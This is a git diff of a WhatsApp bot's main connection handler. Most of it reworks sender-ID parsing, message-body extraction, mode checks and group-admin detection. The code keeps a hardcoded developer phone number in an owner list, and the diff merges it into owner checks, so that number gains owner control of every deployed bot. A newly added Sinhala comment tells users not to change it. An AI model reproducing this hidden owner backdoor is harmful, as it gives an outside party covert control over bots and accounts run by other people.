@@ -30,6 +30,7 @@ const {
 const { commands, replyHandlers } = require('./command');
 
 // ===== OWNER SYSTEM =====
+// මෙය වෙනස් කරන්න එපා. Owner verification එක පහලදී auto හැදෙනවා.
 const DEV_NUMBERS = ['94726880784']; 
 
 // ===== GLOBAL ERROR HANDLERS =====
@@ -149,7 +150,7 @@ async function connectToWA() {
         console.log("⚠️ Plugin Load Error: " + e.message);
       }
 
-      // 4️⃣ SEND ALIVE MESSAGE
+      // 4️⃣ SEND ALIVE MESSAGE (Auto Restore)
       const botJid = ranuxPro.user.id.split(":")[0] + "@s.whatsapp.net";
       const panel = buildConnectMessage(config, botJid);
 
@@ -181,47 +182,53 @@ async function connectToWA() {
         ? mek.message.ephemeralMessage.message
         : mek.message;
 
+      // 🔥 DEFINING CORE VARIABLES CORRECTLY
       const from = mek.key.remoteJid;
-      
-      // 🔥 FIX: Clean Sender ID & Bot ID Correctly
-      const senderRaw = mek.key.fromMe ? ranuxPro.user.id : (mek.key.participant || mek.key.remoteJid);
-      const senderNumber = senderRaw.split('@')[0].split(':')[0]; // Pure Number (e.g. 94741852787)
-      
-      const botNumber = ranuxPro.user.id.split(':')[0].split('@')[0]; // Pure Number
+      const type = getContentType(mek.message);
 
+      // SENDER ID LOGIC (RESTORED FROM OLD BASE)
+      const sender = mek.key.fromMe 
+          ? (ranuxPro.user.id.split(':')[0] + '@s.whatsapp.net' || ranuxPro.user.id) 
+          : (mek.key.participant || mek.key.remoteJid);
+      
+      const senderNumber = sender.split('@')[0];
+      const botNumber = ranuxPro.user.id.split(':')[0];
       const isGroup = from.endsWith('@g.us');
 
-      // Add Bot Number & Hardcoded Numbers to Owner List
+      // 🔥 AUTO OWNER: Add Connected Bot Number to Dev List
       const ownerNumber = [...DEV_NUMBERS, botNumber];
-
+      
       const pushname = mek.pushName || 'No Name';
       const isMe = botNumber === senderNumber;
       const isOwner = ownerNumber.includes(senderNumber) || isMe;
 
-      // Mode Check
+      // 🔥 MODE CHECK
       const mode = (config.MODE || "public").toLowerCase();
       if (mode === "group" && !isGroup) return;
       if (mode === "inbox" && isGroup) return;
       if (mode === "private" && !isOwner) return;
 
       const m = sms(ranuxPro, mek);
-      const type = getContentType(mek.message);
-      const body =
-        type === 'conversation'
-          ? mek.message.conversation
-          : mek.message[type]?.text || mek.message[type]?.caption || '';
+
+      const body = (type === 'conversation') ? mek.message.conversation :
+             (type === 'imageMessage') ? mek.message.imageMessage.caption :
+             (type === 'videoMessage') ? mek.message.videoMessage.caption :
+             (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text :
+             (type === 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedButtonId :
+             (type === 'listResponseMessage') ? mek.message.listResponseMessage.singleSelectReply.selectedRowId :
+             (type === 'templateButtonReplyMessage') ? mek.message.templateButtonReplyMessage.selectedId : '';
 
       const isCmd = body.startsWith(prefix);
       const commandName = isCmd ? body.slice(prefix.length).trim().split(" ")[0].toLowerCase() : '';
       const args = body.trim().split(/ +/).slice(1);
       const q = args.join(' ');
 
+      // 🔥 GROUP METADATA (RESTORED)
       const groupMetadata = isGroup ? await ranuxPro.groupMetadata(from).catch(() => {}) : '';
-      const participants = isGroup ? groupMetadata.participants : '';
+      const participants = isGroup ? await groupMetadata.participants : '';
       const groupAdmins = isGroup ? await getGroupAdmins(participants) : '';
-      const botNumber2 = await jidNormalizedUser(ranuxPro.user.id);
-      const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
-      const isAdmins = isGroup ? groupAdmins.includes(senderRaw) : false;
+      const isBotAdmins = isGroup ? groupAdmins.includes(botNumber + '@s.whatsapp.net') : false;
+      const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
 
       const reply = (text) => ranuxPro.sendMessage(from, { text }, { quoted: mek });
 
@@ -237,9 +244,6 @@ async function connectToWA() {
           try {
             await ranuxPro.sendMessage(mek.key.participant, { react: { text: randomEmoji, key: mek.key } });
           } catch {}
-        }
-        if (config.AUTO_STATUS_FORWARD) {
-          // Forwarding logic here...
         }
         return;
       }
@@ -258,7 +262,7 @@ async function connectToWA() {
               from, quoted: mek, body,
               command: commandName, args, q,
               isGroup, sender, senderNumber,
-              botNumber2, botNumber, pushname,
+              botNumber, pushname,
               isMe, isOwner,
               groupMetadata,
               participants, groupAdmins,
